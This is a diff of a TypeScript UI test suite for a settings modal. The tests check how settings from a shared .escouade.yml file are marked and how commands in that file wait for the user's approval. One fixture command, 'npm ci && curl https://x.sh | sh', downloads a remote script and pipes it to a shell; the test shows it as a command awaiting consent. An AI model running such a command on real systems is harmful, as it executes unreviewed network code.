@@ -42,6 +42,9 @@ const row = (label: string) =>
     .find((e) => e.classList.contains('l') || e.parentElement?.classList.contains('sub-h'))!
     .closest('.sr, .sub-h') as HTMLElement;
 
+/** Another page of the project, from the bar: the file is read on « Équipe », its marks are where its settings are. */
+const to = (page: string) => userEvent.click(within(screen.getByRole('navigation')).getByRole('button', { name: page }));
+
 describe('.escouade.yml in the settings (ESC-146)', () => {
   beforeEach(() => {
     app.modal = { kind: 'settings' };
@@ -50,24 +53,26 @@ describe('.escouade.yml in the settings (ESC-146)', () => {
   it('offers to export when the repository has none, and marks nothing', async () => {
     resetApp({ projects: [shared(null)] });
     const backend = fakeBackend({ shared_write: () => shared({}) });
-    render(SettingsModal, { tab: 'projects', projectId: 'p1' });
+    render(SettingsModal, { page: 'team', projectId: 'p1' });
     expect(screen.getByText(/Ce dépôt n’a pas de \.escouade\.yml/)).toBeInTheDocument();
     expect(screen.queryByText('Défini par .escouade.yml')).toBeNull();
     await userEvent.click(screen.getByRole('button', { name: 'Exporter vers .escouade.yml' }));
     expect(backend.called('shared_write')[0].args).toEqual({ projectId: 'p1' });
     expect(app.toasts.at(-1)?.text).toBe('.escouade.yml écrit. Commite-le pour le partager.');
     // The project as written: its settings marked from now on.
+    await to('Git et worktrees');
     expect(within(row('Un worktree par agent')).getByText('Défini par .escouade.yml')).toBeInTheDocument();
   });
 
-  it('marks the settings the file defines, says what it read and what was left out', () => {
+  it('marks the settings the file defines, says what it read and what was left out', async () => {
     resetApp({
       projects: [shared({ warnings: [{ line: 4, text: 'clé inconnue : board.drafts (voulais-tu dire board.draft_pr ?), ignorée' }] })],
     });
     fakeBackend();
-    render(SettingsModal, { tab: 'projects', projectId: 'p1' });
+    render(SettingsModal, { page: 'team', projectId: 'p1' });
     expect(screen.getByText('Réglages lus dans .escouade.yml (version 1) : 5 réglages définis par le fichier.')).toBeInTheDocument();
     expect(screen.getByText('Ligne 4 : clé inconnue : board.drafts (voulais-tu dire board.draft_pr ?), ignorée')).toBeInTheDocument();
+    await to('Git et worktrees');
     expect(within(row('Un worktree par agent')).getByText('Défini par .escouade.yml')).toBeInTheDocument();
     // Nothing on what the file leaves alone.
     expect(within(row('Dossier des worktrees')).queryByText(/\.escouade\.yml/)).toBeNull();
@@ -77,13 +82,19 @@ describe('.escouade.yml in the settings (ESC-146)', () => {
     resetApp({ projects: [shared({ pending: PENDING })] });
     const trusted = shared({});
     const backend = fakeBackend({ shared_trust: () => trusted });
-    render(SettingsModal, { tab: 'projects', projectId: 'p1' });
+    render(SettingsModal, { page: 'team', projectId: 'p1' });
     const region = screen.getByRole('region', { name: 'Commandes en attente de ton accord' });
     expect(within(region).getByText('npm ci && curl https://x.sh | sh')).toBeInTheDocument();
     expect(within(region).getByText('web')).toBeInTheDocument();
     expect(within(region).getByText('npm test')).toBeInTheDocument();
+    await to('Git et worktrees');
     expect(within(row("À l'ouverture d'un worktree")).getByText('Défini par .escouade.yml, en attente de ton accord')).toBeInTheDocument();
-    await userEvent.click(within(region).getByRole('button', { name: 'Faire confiance à ces commandes' }));
+    await to('Équipe');
+    await userEvent.click(
+      within(screen.getByRole('region', { name: 'Commandes en attente de ton accord' })).getByRole('button', {
+        name: 'Faire confiance à ces commandes',
+      }),
+    );
     expect(backend.called('shared_trust')[0].args).toEqual({ projectId: 'p1', hash: 'h1' });
     expect(screen.queryByRole('region', { name: 'Commandes en attente de ton accord' })).toBeNull();
     expect(app.toasts.at(-1)?.text).toBe('Commandes approuvées : elles s’appliquent au projet.');
@@ -95,7 +106,7 @@ describe('.escouade.yml in the settings (ESC-146)', () => {
       shared_write: () => shared({}),
       shared_unkeep: () => ({ ...shared({}), worktreePerAgent: false }),
     });
-    render(SettingsModal, { tab: 'projects', projectId: 'p1' });
+    render(SettingsModal, { page: 'git', projectId: 'p1' });
     const r = row('Un worktree par agent');
     expect(within(r).getByText('Réglage local de cette machine : il passe devant .escouade.yml.')).toBeInTheDocument();
     await userEvent.click(within(r).getByRole('button', { name: 'Écrire dans .escouade.yml' }));
@@ -112,7 +123,7 @@ describe('.escouade.yml in the settings (ESC-146)', () => {
   it('marks the Kanban’s settings too', () => {
     resetApp({ projects: [shared({ pending: PENDING })] });
     fakeBackend();
-    render(SettingsModal, { tab: 'board', projectId: 'p1' });
+    render(SettingsModal, { page: 'board', projectId: 'p1' });
     expect(within(row('Commande de tests')).getByText('Défini par .escouade.yml, en attente de ton accord')).toBeInTheDocument();
     expect(within(row('Message de commit généré')).queryByText(/\.escouade\.yml/)).toBeNull();
   });
@@ -122,10 +133,10 @@ describe('.escouade.yml in the settings (ESC-146)', () => {
       projects: [shared({ keys: ['private', 'board.model', 'board.effort', 'board.mode'] }, ['board.mode'])],
     });
     fakeBackend();
-    const { unmount } = render(SettingsModal, { tab: 'projects', projectId: 'p1' });
+    const { unmount } = render(SettingsModal, { page: 'privacy', projectId: 'p1' });
     expect(within(row('Projet privé')).getByText('Défini par .escouade.yml')).toBeInTheDocument();
     unmount();
-    render(SettingsModal, { tab: 'board', projectId: 'p1' });
+    render(SettingsModal, { page: 'board', projectId: 'p1' });
     expect(within(row('Modèle')).getByText('Défini par .escouade.yml')).toBeInTheDocument();
     expect(within(row('Effort')).getByText('Défini par .escouade.yml')).toBeInTheDocument();
     expect(within(row('Mode')).getByText('Réglage local de cette machine : il passe devant .escouade.yml.')).toBeInTheDocument();
@@ -136,7 +147,7 @@ describe('.escouade.yml in the settings (ESC-146)', () => {
   it('says why a file that cannot be read sets nothing', () => {
     resetApp({ projects: [shared({ error: { line: 3, text: '.escouade.yml illisible : crochet non fermé' } })] });
     fakeBackend();
-    render(SettingsModal, { tab: 'projects', projectId: 'p1' });
+    render(SettingsModal, { page: 'team', projectId: 'p1' });
     expect(screen.getByText(/rien n’en est appliqué : Ligne 3 : \.escouade\.yml illisible/)).toBeInTheDocument();
     expect(screen.queryByText('Défini par .escouade.yml')).toBeNull();
   });
